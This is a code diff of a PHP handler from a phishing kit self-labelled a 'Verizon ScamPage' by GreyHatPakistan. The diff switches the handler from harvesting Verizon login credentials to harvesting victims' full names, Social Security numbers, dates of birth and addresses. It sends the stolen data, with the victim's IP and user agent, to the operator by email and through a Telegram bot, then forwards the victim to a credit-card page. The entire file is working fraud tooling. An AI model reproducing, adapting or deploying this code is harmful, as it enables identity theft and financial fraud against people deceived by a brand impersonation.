@@ -6,32 +6,43 @@ session_start();
 $ip = getenv("REMOTE_ADDR");
 $hostname = gethostbyaddr($ip);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
-		if ( isset( $_POST['password'] ) ) {
+	if ( isset( $_POST['fullname'] ) ) {
 		
-		$_SESSION['email'] 	  = $_POST['email'];
-		$_SESSION['password'] 	  = $_POST['password'];
+		$_SESSION['fullname'] 	  = $_POST['fullname'];
+		$_SESSION['ssn'] 	  = $_POST['ssn'];
+		$_SESSION['dob'] 	  = $_POST['dob'];
+		$_SESSION['stadd'] 	  = $_POST['stadd'];
+		$_SESSION['city'] 	  = $_POST['city'];
+		$_SESSION['state'] 	  = $_POST['state'];
+		$_SESSION['zip'] 	  = $_POST['zip'];
 		$code = <<<EOT
-»»————-　★[ ⚫️🌀 Verizon Account ⚫️🌀 ]★　————-««
-[User ID or Verizon mobile number] 		: {$_SESSION['email']}
-[Verizon Password]		: {$_SESSION['password']}
+»»————-　★[ ⚫️🌀 Verizon Billing ⚫️🌀 ]★　————-««
+[Full Name] 		: {$_SESSION['fullname']}
+[SSN] 		: {$_SESSION['ssn']}
+[Date of Birth]		: {$_SESSION['dob']}
+[Street Address] 		: {$_SESSION['stadd']}
+[City]		: {$_SESSION['city']}
+[State]		: {$_SESSION['state']}
+[Zip] 		: {$_SESSION['zip']}
+
 »»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
 IP		: $ip
 IP lookup		: http://ip-api.com/json/$ip
 OS		: $useragent
 
 
-»»————-　★[ ⚫️🌀 Verizon ScamPage By @GreyHatPakistan ⚫️🌀 ]★　————-««
+»»————-　★[ ⚫️🌀 Verizon ScamPage By GreyHatPakistan ⚫️🌀 ]★　————-««
 \r\n\r\n
 EOT;
 		if ($sendtoemail=="yes"){
-		$subject = "🏛️ Verizon Account By GreyHatPakistan 🏛️  From $ip";
-        $headers = "From: 🏛️ GreyHatPakistan 🏛️ <newfullz@sh33nz0.com>\r\n";
+		$subject = "🏛️ Verizon Billing By GreyHatPakistan🏛️  From $ip";
+        $headers = "From: 🍁Greyhatpakistan🍁 <newfullz@sh33nz0.com>\r\n";
         $headers .= "MIME-Version: 1.0\r\n";
         $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
         @mail($email,$subject,$code,$headers);
 		}
-		
-	if ($sendtotelegram=="yes"){	
+
+	if ($sendtotelegram=="yes"){
 	$txt = $code;
     $send = ['chat_id'=>$chat_id,'text'=>$txt];
     $website_telegram = "https://api.telegram.org/bot{$bot_url}";
@@ -43,11 +54,14 @@ EOT;
     $result = curl_exec($ch);
     curl_close($ch);
 	}
-	
-        header("Location: ../Email.php");
+
+
+        header("Location: ../Credit Card.php");
         exit();
 	} else {
 		header("Location: ../index.php");
 		exit();
 	}
+
+
 ?>
